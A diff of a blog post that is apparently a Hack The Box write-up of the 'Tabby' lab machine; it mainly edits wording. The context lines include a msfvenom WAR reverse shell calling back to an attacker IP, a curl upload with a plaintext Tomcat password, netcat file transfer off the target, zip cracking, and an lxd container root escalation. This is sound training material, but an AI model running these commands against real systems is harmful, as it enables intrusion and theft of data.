@@ -1,14 +1,14 @@
 ---
 layout: post
 title:  "HTB Writeup [Linux - Easy] - Tabby"
-published: false
+published: true
 ---
 
 ![](/assets/Tabby/Tabby.png)
 
 ## Summary
 - **Tabby** is a **linux** machine hosting both **Apache web server** and **Tomcat**.
-- The website on port 80 had a **Directory Traversal vulnerability** which enabled us to **read a tomcat configuration file** that **contained valid credentials.**
+- The website on port 80 had a **Directory Traversal vulnerability** which enabled us to **read a Tomcat configuration file** which **contained valid credentials.**
 - *Using those,* we **get a user with enough privileges to upload a WAR file containing a reverse shell**. *And, with that*, we **access the box** as the `tomcat` user.
 - We find an **encrypted backup archive in the webroot**. We **crack it** with `john` to **get a password.**
 - The password was *being reused* by another user on the box (`ash`). And, he happened to be **a member of the `lxd` group.**
@@ -70,8 +70,8 @@ that's because `fopen` just **reads a file's contents**. it **doesn't evaluate P
 
 ***Knowing this bit spares us the effort of trying to get code execution by including PHP.***
 
-## Reading sensitive files
-*As a quick check,* I try to read the `ash` user's **private SSH key** from `/home/ash/.ssh/id_rsa`. But it's *not that easy* :)
+## Reading Sensitive Files
+*As a quick check,* I try to read the `ash` user's **private SSH key** (`/home/ash/.ssh/id_rsa`). But it's *not that easy* :)
 
 I then think "maybe I should check out the tomcat to avoid any rabbit holes". In case there's something to be found there.
 
@@ -81,16 +81,14 @@ We get some **decent information** from this page. the **webroot** and **where T
 
 *But, when it comes to sensitive files,* there's **a very important one** called `tomcat-users.xml`. it's in `/usr/share/tomcat9/etc/` by default.
 
-*When checking,* it's there!
-
-and we get **creds for a user** with **very nice privileges** :]
+We found it there and got **creds for a user** with **very nice privileges** :]
 
 ![](/assets/Tabby/reading-tomcat-users-xml.jpg)
 
-## Exploiting the manager-script tomcat role to get RCE
+## Exploiting our Tomcat Privileges for RCE
 The `manager-script` role has access to **upload WAR files.**
 
-which can be a **reverse shell** generated using `msfvenom`. we do that
+to abuse this, we will generate a **WAR reverse shell** with `msfvenom`
 
 ```bash
 msfvenom -p java/shell_reverse_tcp lhost=10.10.16.3 lport=9000 -f war -o revvy.war
@@ -98,7 +96,7 @@ msfvenom -p java/shell_reverse_tcp lhost=10.10.16.3 lport=9000 -f war -o revvy.w
 
 ![](/assets/Tabby/creating-a-war-file.jpg)
 
-and follow with **uploading the WAR file** using `curl`
+then **upload the WAR file** using `curl`
 
 ```bash
 curl -v -u tomcat:'$3cureP4s5w0rd123!' -T revvy.war "http://tabby:8080/manager/text/deploy?path=/shell&update=true"
@@ -110,7 +108,7 @@ start up a `netcat` listener on port 9000
 nc -lvnp 9000
 ```
 
-and `curl` the endpoint for our reverse shell
+and `curl` the endpoint to hit and trigger our reverse shell
 
 ```bash
 curl http://tabby:8080/shell
@@ -120,20 +118,20 @@ curl http://tabby:8080/shell
 
 we're in as `tomcat` :)
 
-## Pivoting through Password Reuse
+## Pivoting with Password Reuse
 
-*Right after improving my shell,* I start with **checking the files** in `/var/www/html`
+*Right after improving our shell,* we start with **checking the files** in `/var/www/html`
 
-there's a folder called `files`. It contained a **password-protected zip archive** that's ***owned by*** the `ash` user.
+there was a folder called `files`. It contained a **password-protected zip archive** that was **owned by** the `ash` user.
 
 ![](/assets/Tabby/finding-ashes-zip-file.jpg)
 
 we **transfer it over** to our kali using `netcat` so we can **crack** it
 
 ```bash
-# on the victim
+# on tabby
 nc -lvnp 5000 < 16162020_backup.zip
-# on the attacker
+# on our kali
 nc tabby 5000 > ash_backup.zip
 ```
 
@@ -141,15 +139,15 @@ nc tabby 5000 > ash_backup.zip
 
 ![](/assets/Tabby/transferring-zip-file.jpg)
 
-we use `zip2john` to **get a hash** for `john` to crack
+we use `zip2john` to **get a hash** for `john` to crack.
 
 ![](/assets/Tabby/zip-password.jpg)
 
-it successfully cracked. but we *didn't find anything important* after unzipping the archive :/
+it successfully cracked. but we *didn't find anything important* within the archive itself.
 
 ![](/assets/Tabby/zip-files.jpg)
 
-the files were *practically the same* as the original ones.
+the files were practically ***the same as the original ones.***
 
 *But, since we now had a password,* we tried it against `ash` and `root`
 
@@ -174,7 +172,7 @@ export PATH=$PATH:/snap/bin/
 
 ![](/assets/Tabby/lxd-init.jpg)
 
-*for a bit of automation,* we're going to throw the commands in a **bash script**. here are the contents:
+*for a bit of automation,* we're going to throw the commands into a **bash script**. here are the contents:
 
 ```bash
 #!/bin/bash
@@ -196,7 +194,7 @@ chmod +s /mnt/root/bin/bash
 
 ## Cleaning Up
 
-*To clear out any remnants,* we have to **stop the container**, **delete it** along with **the image we imported.**
+*To clear away remnants,* we have to **stop the container**, **delete it** along with **the image we imported.**
 
 ```bash
 lxc stop mycontainer
